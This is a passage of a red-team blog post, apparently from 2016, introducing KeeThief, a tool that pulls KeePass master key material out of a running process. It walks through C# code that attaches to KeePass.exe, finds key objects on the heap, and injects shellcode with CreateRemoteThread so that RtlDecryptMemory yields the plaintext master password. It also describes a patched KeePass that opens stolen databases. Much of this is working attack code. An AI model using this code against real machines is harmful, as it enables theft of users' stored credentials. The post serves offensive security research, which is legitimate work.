@@ -1,0 +1,337 @@
+<p><b>Note:</b><span style="font-weight: 400;"> this post and code were co-written with my fellow ATD workmate Lee Christensen (</span><a href="https://twitter.com/tifkin_"><span style="font-weight: 400;">@tifkin_</span></a><span style="font-weight: 400;">) who developed several of the interesting components of the project.</span></p>
+<p><span style="font-weight: 400;">The other week I published the &#8220;</span><a href="http://www.harmj0y.net/blog/redteaming/a-case-study-in-attacking-keepass/"><i><span style="font-weight: 400;">A Case Study in Attacking KeePass</span></i></a><span style="font-weight: 400;">&#8221; post detailing a few notes on how to operationally &#8220;attack&#8221; KeePass installations. This generated an unexpected amount of responses, most good, but a few negative and dismissive. Some comments centered around the mentality of &#8220;</span><i><span style="font-weight: 400;">if an attacker has code execution on your system you&#8217;re screwed already so who cares</span></i><span style="font-weight: 400;">&#8220;. Our counterpoint to this is that protecting your computer from malicious compromise is a very different problem when it’s joined to a domain versus isolated for home use. As professional pentesters/red teamers we&#8217;re highly interested in post-exploitation techniques applicable to enterprise environments, which is why we started looking into ways to &#8220;attack&#8221; KeePass installations in the first place. Our targets are not isolated home users.</span></p>
+<p><span style="font-weight: 400;">Other responses centered around the misconception that you need administrative access to perform most of these actions, that &#8220;</span><i><span style="font-weight: 400;">all of this basically relies on getting the password from a keylogger</span></i><span style="font-weight: 400;">&#8220;, or that the </span><a href="http://keepass.info/help/kb/sec_desk.html"><span style="font-weight: 400;">secure desktop</span></a><span style="font-weight: 400;"> setting negates everything mentioned. This post hopes to address all of those points.</span></p>
+<p><span style="font-weight: 400;">Lee and I dove back into KeePass during the few days following the post&#8217;s release and came up with an additional approach that </span><b>a)</b><span style="font-weight: 400;"> doesn&#8217;t need administrative rights, </span><b>b)</b><span style="font-weight: 400;"> doesn&#8217;t require a keylogger, and </span><b>c)</b><span style="font-weight: 400;"> negates the secure desktop protection (assuming the database is unlocked). If the database isn&#8217;t opened, see the </span><b>Persistently Mining KeePass</b><span style="font-weight: 400;"> section of this post which details ways to execute this logic whenever KeePass launches.</span></p>
+<p><span style="font-weight: 400;">The <strong>Exfiltration Without Malware &#8211; KeePass&#8217; Trigger System</strong> section shows simple ways to dump all password entries on a database unlock <em>without malware</em>. This method also doesn&#8217;t need administrative rights nor a keylogger, and is also indifferent to the secure desktop protection.</span></p>
+<p><b>Note:</b><span style="font-weight: 400;"> this write-up does not cover any ‘vulnerability’ in KeePass or a KeePass database/deployment and we are not claiming that we “broke” KeePass. There’s no CVE here and there’s no universal fix for this type of approach (though we do cover a few mitigation approaches in the </span><b>Defenses</b><span style="font-weight: 400;"> section). We don&#8217;t really view this as an attack on KeePass specifically, as memory manipulation key recovery attacks are likely applicable to any other password managers by nature of an attacker operating in the same security context as the program. We&#8217;ll emphasize this point throughout the post, which will likely read as a &#8216;duh&#8217; to many people: </span><i><span style="font-weight: 400;">if a database is unlocked, the key material likely has to be somewhere in the process space, so we can probably extract it</span></i><span style="font-weight: 400;">.</span></p>
+<p>Here&#8217;s tl;dr :</p>
+<p><figure id="attachment_3155" aria-describedby="caption-attachment-3155" style="width: 640px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" class="wp-image-3155 size-large" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/07/1_keepass_securedesktop-1024x819.png" alt="1_keepass_securedesktop" width="640" height="512" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/07/1_keepass_securedesktop-1024x819.png 1024w, https://blog.harmj0y.net/wp-content/uploads/2016/07/1_keepass_securedesktop-300x240.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/07/1_keepass_securedesktop-768x614.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/07/1_keepass_securedesktop.png 1234w" sizes="(max-width: 640px) 100vw, 640px" /><figcaption id="caption-attachment-3155" class="wp-caption-text">1. Entering a KeePass master password, keyfile, and Windows User Account through “secure desktop”.</figcaption></figure></p>
+<p><figure id="attachment_3156" aria-describedby="caption-attachment-3156" style="width: 640px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" class="wp-image-3156 size-large" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/07/2_get_keepassdatabasekey-1024x981.png" alt="2_get_keepassdatabasekey" width="640" height="613" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/07/2_get_keepassdatabasekey-1024x981.png 1024w, https://blog.harmj0y.net/wp-content/uploads/2016/07/2_get_keepassdatabasekey-300x287.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/07/2_get_keepassdatabasekey-768x736.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/07/2_get_keepassdatabasekey.png 1356w" sizes="(max-width: 640px) 100vw, 640px" /><figcaption id="caption-attachment-3156" class="wp-caption-text">2. Extracting all three key material components from the memory space of the running KeePass.exe process with the unlocked database.</figcaption></figure></p>
+<p><figure id="attachment_3157" aria-describedby="caption-attachment-3157" style="width: 640px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" class="wp-image-3157 size-large" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/07/3_patched_keepass-1024x802.png" alt="3_patched_keepass" width="640" height="501" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/07/3_patched_keepass-1024x802.png 1024w, https://blog.harmj0y.net/wp-content/uploads/2016/07/3_patched_keepass-300x235.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/07/3_patched_keepass-768x602.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/07/3_patched_keepass.png 1340w" sizes="(max-width: 640px) 100vw, 640px" /><figcaption id="caption-attachment-3157" class="wp-caption-text">3. Entering the extracted key material with a patched KeePass installation on a separate computer with the exfiltrated database.</figcaption></figure></p>
+<p><figure id="attachment_3158" aria-describedby="caption-attachment-3158" style="width: 640px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" class="wp-image-3158 size-large" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/07/4_open_database-1024x806.png" alt="4_open_database" width="640" height="504" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/07/4_open_database-1024x806.png 1024w, https://blog.harmj0y.net/wp-content/uploads/2016/07/4_open_database-300x236.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/07/4_open_database-768x604.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/07/4_open_database.png 1328w" sizes="(max-width: 640px) 100vw, 640px" /><figcaption id="caption-attachment-3158" class="wp-caption-text">4. The exfiltrated database opened on another machine.</figcaption></figure></p>
+<p><span style="font-weight: 400;"><a href="https://github.com/adaptivethreat/KeeThief">KeeThief</a> is our open source project that is capable of extracting key material out of the memory of a running KeePass process with an unlocked database, including the plaintext of the master database password. It includes a C# executable/assembly and a .NET version 2.0 compatible, self-contained <a href="https://github.com/adaptivethreat/KeeThief/tree/master/PowerShell">PowerShell script</a> that works on stock Windows 7+. The project also includes a patched version of KeePass 2.34 that accepts the extracted key material to unlock an exfiltrated database (as seen in the above screenshots) instead of requiring the complete key file and/or Windows user account master keys. The KeeThief project code is <a href="https://github.com/adaptivethreat/KeeThief">live here</a>.</span></p>
+<h2>KeeFarce&#8217;s Approach</h2>
+<p><span style="font-weight: 400;">Some of you probably heard of denandz&#8217; awesome </span><a href="https://github.com/denandz/KeeFarce/"><span style="font-weight: 400;">KeeFarce project</span></a><span style="font-weight: 400;">, which made some waves at the end of last year. This approach was a bit of black magic to me when it came out, until Lee explained exactly how it worked and I dove into the source. Here&#8217;s how we currently understand the KeeFarce process:</span></p>
+<ol>
+<li><span style="font-weight: 400;">First KeeFarce loads a malicious DLL into the target KeePass process by using VirtualAllocEx()/CreateRemoteThread() </span><a href="https://github.com/denandz/KeeFarce/blob/a600351c28d040c48e467d8f4f886c9bdfbf3029/src/KeeFarce/Injection.cpp#L49-L73"><span style="font-weight: 400;">to force a call LoadLibraryA()</span></a><span style="font-weight: 400;"> in order to load a bootstrap DLL off of disk.</span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">The bootstrap DLL loads the .NET common language runtime (CLR) and then loads a custom .NET assembly/DLL from disk once the CLR is started.</span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">The malicious assembly loads CLR MD and attaches to the current KeePass.exe process. It then </span><a href="https://github.com/denandz/KeeFarce/blob/e06dbe17124c8f938294971545f5ce09264bd701/src/KeeFarceDLL/main.cs#L30-L63"><span style="font-weight: 400;">walks the heap enumerating .NET objects</span></a><span style="font-weight: 400;">, searching for a </span><a href="https://fossies.org/dox/KeePass-2.34-Source/classKeePass_1_1UI_1_1DocumentManagerEx.html"><span style="font-weight: 400;">KeePass.UI.DocumentManagerEx</span></a><span style="font-weight: 400;"> object and saving information about this object. We&#8217;ll talk more about CLR MD in a bit.</span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">The malicious assembly then </span><a href="https://github.com/denandz/KeeFarce/blob/e06dbe17124c8f938294971545f5ce09264bd701/src/KeeFarceDLL/main.cs#L71-L72"><span style="font-weight: 400;">loads the KeePass assembly with reflection</span></a><span style="font-weight: 400;"> and </span><a href="https://github.com/denandz/KeeFarce/blob/e06dbe17124c8f938294971545f5ce09264bd701/src/KeeFarceDLL/main.cs#L73-92"><span style="font-weight: 400;">instantiates</span></a><span style="font-weight: 400;"> a </span><a href="https://fossies.org/dox/KeePass-2.34-Source/classKeePass_1_1DataExchange_1_1PwExportInfo.html"><span style="font-weight: 400;">KeePass.DataExchange.PwExportInfo</span></a><span style="font-weight: 400;"> object. The malicious .NET assembly can do this because it&#8217;s operating in the same process space as the managed (.NET) KeePass.exe binary.</span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">A </span><a href="https://fossies.org/dox/KeePass-2.34-Source/namespaceKeePass_1_1DataExchange_1_1Formats.html"><span style="font-weight: 400;">KeePass.DataExchange.Formats.KeePassCsv1x</span></a><span style="font-weight: 400;"> type </span><a href="https://github.com/denandz/KeeFarce/blob/e06dbe17124c8f938294971545f5ce09264bd701/src/KeeFarceDLL/main.cs#L97-L106"><span style="font-weight: 400;">is instantiated</span></a><span style="font-weight: 400;">, additional export parameters are set, including the saved document manager data, and the </span><a href="https://github.com/denandz/KeeFarce/blob/e06dbe17124c8f938294971545f5ce09264bd701/src/KeeFarceDLL/main.cs#L130"><span style="font-weight: 400;">export method is invoked</span></a><span style="font-weight: 400;">. This exports all of the current database passwords to a .csv file in %AppData%.</span></li>
+</ol>
+<p><span style="font-weight: 400;">One thing to note here is that in order to invoke methods of .NET objects on the heap of a CLR application, you must be in the same process space as the methods you&#8217;re targeting. So if you want to execute a specific KeePass .NET method (e.g. KeePass.DataExchange.Formats.KeePassCsv1x::Export), you must have code executing inside the KeePass.exe process space. Invoking .NET methods is a tall order (but not impossible) for straight shellcode, so the easiest method is to inject a .DLL à la the KeeFarce or </span><a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerPick/PSInjector/PSInject.ps1"><b>Invoke-PSInject</b></a><span style="font-weight: 400;"> approach.</span></p>
+<h2>KeePass and Data Protection</h2>
+<p><span style="font-weight: 400;">I mentioned the Data Protection Application Programming Interface (DPAPI) briefly in the last post. DPAPI gives programmers a simple way to reasonably secure data on disk while a program is executing, where implicit per-user encryption keys are used to protect data &#8220;blobs&#8221; with minimal additional effort on the programmer&#8217;s part. The methods <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa387693(v=vs.85).aspx"><span style="font-weight: 400;">RtlEncryptMemory()</span></a><span style="font-weight: 400;"> and </span><span style="font-weight: 400;"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa387692(v=vs.85).aspx">RtlDecryptMemory()</a> can be used to protect data in memory, also with per-user (or per-process, depending on selection options) ephemeral keys being used to encrypt the data.</span></span></p>
+<p><span style="font-weight: 400;">KeePass stores in-memory master key material as byte arrays using its internal </span><a href="https://fossies.org/dox/KeePass-2.34-Source/ProtectedBinary_8cs_source.html"><span style="font-weight: 400;">ProtectedBinary</span></a><span style="font-weight: 400;"> class. This class encrypts these arrays by means of the the .NET class System.Security.Cryptography.ProtectedMemory class, which underneath calls the methods </span><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa387693(v=vs.85).aspx"><span style="font-weight: 400;">RtlEncryptMemory()</span></a><span style="font-weight: 400;"> and </span><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa387692(v=vs.85).aspx"><span style="font-weight: 400;">RtlDecryptMemory()</span></a><span style="font-weight: 400;">. For in-memory/same process protection the OptionFlags parameter for these API calls is set to 0 (a.k.a. the “SameProcess” scope) which causes the call to, &#8220;</span><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa387693(v=vs.85).aspx"><i><span style="font-weight: 400;">Encrypt and decrypt memory in the same process. An application running in a different process will not be able to decrypt the data</span></i></a><span style="font-weight: 400;">&#8220;. This means that the encrypted master keys can only be decrypted from within the KeePass.exe process*. We&#8217;ll come back to this in just a bit.</span></p>
+<p><span style="font-weight: 400;">For the &#8220;Windows User Account&#8221; setting, KeePass stores a generated secret key as a DPAPI blob on disk at </span><b>%APPDATA%\KeePass\ProtectedUserKey.bin</b><span style="font-weight: 400;">. This data is encrypted using the user&#8217;s DPAPI master key and entropy specific to KeePass (see </span><a href="https://fossies.org/dox/KeePass-2.34-Source/KcpUserAccount_8cs_source.html"><span style="font-weight: 400;">m_pbEntropy</span></a><span style="font-weight: 400;">). This data is protected with a &#8220;CurrentUser&#8221; scope, which is why we were able to recover that key material from disk in the last post.</span></p>
+<p><span style="font-weight: 400;">*<em> That is, unless you write and load a driver which dumps the the per-process encryption keys from the kernel. See </em></span><em><a href="https://twitter.com/gentilkiwi/status/748436076738547712"><span style="font-weight: 400;">this Twitter thread</span></a></em><span style="font-weight: 400;"><em> with Benjamin Delpy, the author of Mimikatz.</em> </span></p>
+<h2>KeeThief&#8217;s Approach</h2>
+<p><span style="font-weight: 400;">Both KeeThief and KeeFarce make use of &#8220;CLR MD&#8221;, aka the &#8220;Microsoft.Diagnostics.Runtime.dll&#8221; assembly </span><a href="https://github.com/Microsoft/clrmd"><span style="font-weight: 400;">released under the MIT license by Microsoft</span></a><span style="font-weight: 400;">. This is a .NET/CLR process and crash dump introspection library which also allows for the attachment to live processes. It lets you do useful things like walk the heap of a live process for CLR objects and inspect the types/data for each, assuming you have access to the remote space (i.e. meaning same user/integrity level or administrative rights). Microsoft released some good </span><a href="https://github.com/Microsoft/clrmd/tree/master/Documentation"><span style="font-weight: 400;">getting started documentation</span></a><span style="font-weight: 400;"> in case anyone&#8217;s interested.</span></p>
+<p><span style="font-weight: 400;">So let&#8217;s attach to the KeePass.exe process space using CLR MD and walk the heap objects until we find a </span><a href="https://fossies.org/dox/KeePass-2.34-Source/classKeePassLib_1_1PwDatabase.html"><span style="font-weight: 400;">KeePassLib.PwDatabase</span></a><span style="font-weight: 400;"> object (similar to KeeFarce&#8217;s initial approach). This is the currently opened KeePass database:</span></p>
+<pre class="height-set:true lang:c# decode:true">dt = DataTarget.AttachToProcess(process.Id, 50000);
+
+if (dt.ClrVersions.Count == 0)
+{
+    string err = "CLR is not loaded. Is it Keepass 1.x, perhaps?";
+    Logger.WriteLine(err);
+    throw new Exception(err);
+}
+
+if (dt.ClrVersions.Count &gt; 1)
+{
+    Logger.WriteLine("*** Interesting... there are multiple .NET runtimes loaded in KeePass");
+}
+
+ClrInfo Version = dt.ClrVersions[0];
+ClrRuntime Runtime = Version.CreateRuntime();
+ClrHeap Heap = Runtime.GetHeap();
+
+if (!Heap.CanWalkHeap)
+{
+    string err = "Error: Cannot walk the heap!";
+    Logger.WriteLine(err);
+    throw new Exception(err);
+}
+
+foreach (ulong obj in Heap.EnumerateObjectAddresses())
+{
+    ClrType type = Heap.GetObjectType(obj);
+
+    if (type == null || type.Name != "KeePassLib.PwDatabase")
+        continue;
+
+    Logger.WriteLine("************ Found a PwDatabase! **********");
+</pre>
+<p><span style="font-weight: 400;">Now we can use the GetReferencedObjects() method to enumerate all the objects referenced by the database instances. We&#8217;ll first walk all objects looking for a </span><a href="https://fossies.org/dox/KeePass-2.34-Source/classKeePassLib_1_1Serialization_1_1IOConnectionInfo.html"><span style="font-weight: 400;">KeePassLib.Serialization.IOConnectionInfo</span></a><span style="font-weight: 400;"> object (this is the open database file). This is so we can extract the opened database path:</span></p>
+<pre class="height-set:true lang:c# decode:true">// First walk the referenced objects to find the database path
+foreach (ulong refObj in referencedObjects)
+{
+    ClrType refObjType = Heap.GetObjectType(refObj);
+    if (refObjType.Name == "KeePassLib.Serialization.IOConnectionInfo")
+    {
+        ClrInstanceField UrlField = refObjType.GetFieldByName("m_strUrl");
+        ulong UrlFieldAddr = UrlField.GetAddress(refObj);
+        object Url = UrlField.GetValue(UrlFieldAddr, true);
+        databaseLocation = (string)Url;
+    }
+}</pre>
+<p><span style="font-weight: 400;">Then we walk all referenced objects again, searching for any </span><a href="https://fossies.org/dox/KeePass-2.34-Source/classKeePassLib_1_1Keys_1_1KcpPassword.html"><span style="font-weight: 400;">KeePassLib.Keys.KcpPassword</span></a><span style="font-weight: 400;">, </span><a href="https://fossies.org/dox/KeePass-2.34-Source/classKeePassLib_1_1Keys_1_1KcpKeyFile.html"><span style="font-weight: 400;">KeePassLib.Keys.KcpKeyFile</span></a><span style="font-weight: 400;">, or </span><a href="https://fossies.org/dox/KeePass-2.34-Source/classKeePassLib_1_1Keys_1_1KcpUserAccount.html"><span style="font-weight: 400;">KeePassLib.Keys.KcpUserAccount</span></a><span style="font-weight: 400;"> objects that are a part of a </span><a href="https://fossies.org/dox/KeePass-2.34-Source/classKeePassLib_1_1Keys_1_1CompositeKey.html"><span style="font-weight: 400;">KeePassLib.Keys.CompositeKey</span></a><span style="font-weight: 400;">. These objects are internal to KeePass and contain the protected data blobs for passwords, key files, and user account protections, respectively:</span></p>
+<pre class="height-set:true lang:c# decode:true">    referencedObjects = ClrMDHelper.GetReferencedObjects(Heap, obj);
+
+    // now walk the referenced objects looking for a master composite key
+    foreach (ulong refObj in referencedObjects)
+    {
+
+        ClrType refObjType = Heap.GetObjectType(refObj);
+        if (refObjType.Name == "KeePassLib.Keys.CompositeKey")
+        {
+
+            Logger.WriteLine("************ Found a CompositeKey! **********");
+            CompositeKeyInfo CompositeKey = new CompositeKeyInfo();
+
+            // Get all objects kept alive by the composite key.
+            // (A shortcut to get references to all Key types)
+            List&lt;ulong&gt; referencedObjects2 = ClrMDHelper.GetReferencedObjects(Heap, refObj);
+
+            foreach (ulong refObj2 in referencedObjects2)
+            {
+                ClrType refObjType2 = Heap.GetObjectType(refObj2);
+
+                if (refObjType2.Name == "KeePassLib.Keys.KcpPassword")
+                {
+                    KcpPassword KcpPassword = GetKcpPasswordInfo(refObj2, refObjType2, Heap, databaseLocation);
+
+                    if (KcpPassword == null)
+                        continue;
+
+                    CompositeKey.AddUserKey(KcpPassword);
+                }
+                else if (refObjType2.Name == "KeePassLib.Keys.KcpKeyFile")
+                {
+                    KcpKeyFile KcpKeyFile = GetKcpKeyFileInfo(refObj2, refObjType2, Heap, databaseLocation);
+
+                    if (KcpKeyFile == null)
+                        continue;
+
+                    CompositeKey.AddUserKey(KcpKeyFile);
+                }
+                else if (refObjType2.Name == "KeePassLib.Keys.KcpUserAccount")
+                {
+                    KcpUserAccount KcpUserAccount = GetKcpUserAccountInfo(refObj2, refObjType2, Heap, databaseLocation);
+
+                    if (KcpUserAccount == null)
+                        continue;
+
+                    CompositeKey.AddUserKey(KcpUserAccount);
+                }
+            }
+            if (CompositeKey.UserKeyCount &gt; 0)
+                keyInfo.Add(CompositeKey);
+
+        }</pre>
+<p><span style="font-weight: 400;">For each key object type, we enumerate the </span><a href="https://fossies.org/dox/KeePass-2.34-Source/classKeePassLib_1_1Security_1_1ProtectedBinary.html"><span style="font-weight: 400;">ProtectedBinary</span></a><span style="font-weight: 400;"> object associated with the key and ultimately pull out the protected &#8220;m_pbData&#8221; blobs which hold the in-memory protected byte arrays:</span></p>
+<pre class="height-set:true lang:c# decode:true">    public static KcpPassword GetKcpPasswordInfo(ulong KcpPasswordAddr, ClrType KcpPasswordType, ClrHeap Heap, string databaseLocation)
+    {
+        KcpPassword PasswordInfo = new KcpPassword();
+
+        // Protected String
+        ClrInstanceField KcpProtectedStringField = KcpPasswordType.GetFieldByName("m_psPassword");
+        ulong KcpProtectedStringAddr = KcpProtectedStringField.GetAddress(KcpPasswordAddr);
+        ulong KcpProtectedStringObjAddr = (ulong)KcpProtectedStringField.GetValue(KcpPasswordAddr);
+
+        // Get the embedded ProtectedBinary
+        ClrInstanceField KcpProtectedBinaryField = KcpProtectedStringField.Type.GetFieldByName("m_pbUtf8");
+        ulong KcpProtectedBinaryAddr = KcpProtectedBinaryField.GetAddress(KcpProtectedStringObjAddr);
+        ulong KcpProtectedBinaryObjAddr = (ulong)KcpProtectedBinaryField.GetValue(KcpProtectedStringObjAddr);
+
+        ClrInstanceField EncDataField = KcpProtectedBinaryField.Type.GetFieldByName("m_pbData");
+        ulong EncDataAddr = EncDataField.GetAddress(KcpProtectedBinaryObjAddr);
+        ulong EncDataArrayAddr = (ulong)EncDataField.GetValue(KcpProtectedBinaryObjAddr);
+
+        ClrType EncDataArrayType = Heap.GetObjectType(EncDataArrayAddr);
+        int len = EncDataField.Type.GetArrayLength(EncDataArrayAddr);
+
+        if (len &lt;= 0 || len % 16 != 0) // Small sanity check to make sure everything's ok
+            return null;
+
+        byte[] EncData = new byte[len];
+        for (int i = 0; i &lt; len; i++)
+        {
+            EncData[i] = (byte)EncDataArrayType.GetArrayElementValue(EncDataArrayAddr, i);
+        }
+
+        PasswordInfo.databaseLocation = databaseLocation;
+        PasswordInfo.encryptedBlob = EncData;
+        PasswordInfo.encryptedBlobAddress = (IntPtr)KcpPasswordType.GetArrayElementAddress(EncDataArrayAddr, 0);
+        PasswordInfo.encryptedBlobLen = len;
+
+        return PasswordInfo;
+    }</pre>
+<p><span style="font-weight: 400;">Here we hit a small roadblock. Since the binary blobs are protected with the &#8220;SameProcess&#8221; flag for </span><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa387693%28v=vs.85%29.aspx?f=255&amp;MSPPError=-2147217396"><span style="font-weight: 400;">RtlEncryptMemory()</span></a><span style="font-weight: 400;">, we can&#8217;t just decrypt the data (since we&#8217;re not in the same process). The answer that Lee came up with is some simple shellcode that calls </span><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa387692(v=vs.85).aspx"><span style="font-weight: 400;">RtlDecryptMemory()</span></a><span style="font-weight: 400;"> to decrypt a specified encrypted blob. We can inject this into the running KeePass.exe process to ride on top of the per-process encryption keys, retrieving the result after decryption. This injection only requires permission to modify the KeePass process space (which the current user running KeePass.exe has); it doesn&#8217;t require administrative rights.</span></p>
+<pre class="height-set:true lang:c# decode:true">    public static void ExtractKeyInfo(IUserKey key, IntPtr ProcessHandle, bool DecryptKeys)
+    {
+        if (!DecryptKeys)
+        {
+            Logger.WriteLine(key);
+        }
+        else
+        {
+            IntPtr EncryptedBlobAddr = Win32.AllocateRemoteBuffer(ProcessHandle, key.encryptedBlob);
+            byte[] Shellcode = GenerateDecryptionShellCode(EncryptedBlobAddr, key.encryptedBlob.Length);
+
+            // Execute the ShellCode
+            IntPtr ShellcodeAddr = Win32.AllocateRemoteBuffer(ProcessHandle, Shellcode);
+
+            IntPtr ThreadId = IntPtr.Zero;
+            IntPtr RemoteThreadHandle = Win32.CreateRemoteThread(ProcessHandle, IntPtr.Zero, 0, ShellcodeAddr, IntPtr.Zero, 0, out ThreadId);
+            if (RemoteThreadHandle == IntPtr.Zero)
+            {
+                Logger.WriteLine("Error: Could not create a thread for the shellcode");
+                return;
+            }
+
+            // Read plaintext password!
+            Thread.Sleep(1000);
+            IntPtr NumBytes;
+            byte[] plaintextBytes = new byte[key.encryptedBlob.Length];
+            int res = Win32.ReadProcessMemory(ProcessHandle, EncryptedBlobAddr, plaintextBytes, plaintextBytes.Length, out NumBytes);
+            if (res != 0 &amp;&amp; NumBytes.ToInt64() == plaintextBytes.Length)
+            {
+                key.plaintextBlob = plaintextBytes;
+                Logger.WriteLine(key);
+            }
+
+        }
+    }
+
+    public static byte[] GenerateDecryptionShellCode(IntPtr EncryptedBlobAddr, int EncryptBlobLen)
+    {
+        byte[] shellcode32 = { 0x83, 0xEC, 0x10, ..... };
+        byte[] shellcode64 = { 0xE9, 0x9B, 0x01, ..... };
+        byte[] shellcode = null;
+
+        if (IntPtr.Size == 4)
+            shellcode = shellcode32;
+        else
+            shellcode = shellcode64;
+
+        int PasswordAddrOffset = shellcode.IndexOfSequence(new byte[] { 0x41, 0x41, 0x41, 0x41 }, 0);
+        if (PasswordAddrOffset != -1)
+            Array.Copy(BitConverter.GetBytes((ulong)EncryptedBlobAddr), 0, shellcode, PasswordAddrOffset, 4);
+        else
+            throw new Exception("Could not find address marker in shellcode");
+
+        int PasswordLenOffset = shellcode.IndexOfSequence(new byte[] { 0x42, 0x42, 0x42, 0x42 }, 0);
+        if (PasswordLenOffset != -1)
+        {
+            Array.Copy(BitConverter.GetBytes(EncryptBlobLen), 0, shellcode, PasswordLenOffset, 4);
+        }
+
+        return shellcode;
+    }</pre>
+<p><span style="font-weight: 400;">Since neither Lee nor I are shellcode experts, he used </span><a href="https://twitter.com/mattifestation"><span style="font-weight: 400;">Matt Graeber</span></a><span style="font-weight: 400;">&#8216;s </span><a href="https://github.com/mattifestation/PIC_Bindshell"><span style="font-weight: 400;">PIC_Bindshell</span></a><span style="font-weight: 400;"> project. This code (written in C) and </span><a href="http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html"><span style="font-weight: 400;">Matt&#8217;s guidance on the subject</span></a><span style="font-weight: 400;"> greatly simplifies writing position-independent shellcode, and Lee was able to build x86/x64 shellcode that calls </span><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa387692(v=vs.85).aspx"><span style="font-weight: 400;">RtlDecryptMemory()</span></a><span style="font-weight: 400;"> on the encrypted data. The shellcode used by KeeThief is located in the</span> <a href="https://github.com/adaptivethreat/KeeThief/tree/master/DecryptionShellcode">./DecryptionShellcode/</a> folder.</p>
+<p><span style="font-weight: 400;">Since we can compile this project as a single self-contained C# binary we aren&#8217;t restricted to running a binary on disk, as .NET provides the </span><b>[System.Reflection.Assembly]::Load(byte[] rawAssembly)</b><span style="font-weight: 400;"> static method which will load a .NET EXE/DLL into memory. Matt talked about this previously in his 2012 &#8220;</span><a href="http://www.exploit-monday.com/2012/12/in-memory-dll-loading.html"><i><span style="font-weight: 400;">In-Memory Managed Dll Loading With PowerShell</span></i></a><span style="font-weight: 400;">&#8221; post. We used the the </span><a href="https://github.com/PowerShellMafia/PowerSploit/blob/237d362acff8ef134f0ccc9150e6b6ab8a25e768/ScriptModification/Out-CompressedDll.ps1"><span style="font-weight: 400;">Out-CompressedDll</span></a><span style="font-weight: 400;"> PowerSploit function mentioned in the post to compress the resulting KeeThief assembly and <a href="https://github.com/adaptivethreat/KeeThief/blob/9e60798ba51d03de687bbc1a5248f12032b01951/PowerShell/KeeThief.ps1#L105">load it in memory</a> in a <a href="https://github.com/adaptivethreat/KeeThief/blob/9e60798ba51d03de687bbc1a5248f12032b01951/PowerShell/KeeThief.ps1">PowerShell script</a>, invoking the <a href="https://github.com/adaptivethreat/KeeThief/blob/9e60798ba51d03de687bbc1a5248f12032b01951/PowerShell/KeeThief.ps1#L123">GetKeePassMasterKeys()</a> method.</span></p>
+<p><span style="font-weight: 400;">Here&#8217;s the end result of the </span><b>Get-KeePassDatabaseKey</b><span style="font-weight: 400;"> function with the decrypted plaintext key material for a running KeePass.exe process (on a stock Windows 7 machine):</span></p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-3156" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/07/2_get_keepassdatabasekey-1024x981.png" alt="2_get_keepassdatabasekey" width="640" height="613" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/07/2_get_keepassdatabasekey-1024x981.png 1024w, https://blog.harmj0y.net/wp-content/uploads/2016/07/2_get_keepassdatabasekey-300x287.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/07/2_get_keepassdatabasekey-768x736.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/07/2_get_keepassdatabasekey.png 1356w" sizes="(max-width: 640px) 100vw, 640px" /></p>
+<p><span style="font-weight: 400;">Now we have the issue of how to reuse this plaintext data to open an exfiltrated database on another system. Luckily for us KeePass is open source and GPL&#8217;ed, so we can modify the source code to manually specify our extracted key material. If we modify the constructors of the </span><a href="https://fossies.org/dox/KeePass-2.34-Source/KcpKeyFile_8cs_source.html"><span style="font-weight: 400;">KcpKeyFile.cs</span></a><span style="font-weight: 400;"> and </span><a href="https://fossies.org/dox/KeePass-2.34-Source/KcpUserAccount_8cs_source.html"><span style="font-weight: 400;">KcpUserAccount.cs</span></a><span style="font-weight: 400;"> files to accept raw bytes of the unprotected key material, as well as some of the front-end UI forms (KeePromptForm.cs, KeePromptForm.Designer.cs) we can get the result that was seen in the initial screenshots. The “Base64 Key File” and “Base64 WUA” are the base64-encoded representations of the “plaintext” binary key material recovered by </span><b>Get-KeePassDatabaseKey</b><span style="font-weight: 400;"> above.</span></p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-3157" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/07/3_patched_keepass-1024x802.png" alt="3_patched_keepass" width="640" height="501" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/07/3_patched_keepass-1024x802.png 1024w, https://blog.harmj0y.net/wp-content/uploads/2016/07/3_patched_keepass-300x235.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/07/3_patched_keepass-768x602.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/07/3_patched_keepass.png 1340w" sizes="(max-width: 640px) 100vw, 640px" /></p>
